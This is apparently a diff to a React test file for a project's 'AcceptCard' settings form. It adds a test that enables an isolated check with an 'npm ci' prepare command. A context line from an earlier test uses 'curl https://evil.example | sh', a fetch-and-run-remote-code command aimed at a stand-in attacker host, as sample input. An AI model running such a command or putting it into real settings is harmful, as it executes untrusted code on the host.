@@ -31,4 +31,19 @@ describe("AcceptCard", () => {
     await waitFor(() => expect(calls.find((call) => call.method === "PUT")?.body).toMatchObject({ check_command: "curl https://evil.example | sh" }));
     await waitFor(() => expect(screen.queryByTestId("restored-check-command")).not.toBeInTheDocument());
   });
+
+  it("turns the isolated check on with a prepare command (R7-C01)", async () => {
+    const accept: ProjectAccept = { project_id: 3, check_command: "", budget_usd: 0, budget_minutes: 0, effective: "mise run check", effective_source: "automatic" };
+    const calls = stubApi((call) => {
+      if (call.path === "/projects/3/accept" && call.method === "GET") return { body: { data: accept } };
+      if (call.path === "/projects/3/accept" && call.method === "PUT") return { body: { data: { ...accept, ...(call.body as object) } } };
+      return undefined;
+    });
+    renderWithClient(<AcceptCard projectId={3} />);
+    await screen.findByText(/Runs now/); // the form starts afresh once the saved values arrive
+    await userEvent.click(screen.getByRole("checkbox", { name: "Isolated check" }));
+    await userEvent.type(screen.getByRole("textbox", { name: "Prepare command" }), "npm ci");
+    await userEvent.click(screen.getByRole("button", { name: "Save" }));
+    await waitFor(() => expect(calls.find((call) => call.method === "PUT")?.body).toMatchObject({ check_isolated: true, check_prepare: "npm ci" }));
+  });
 });
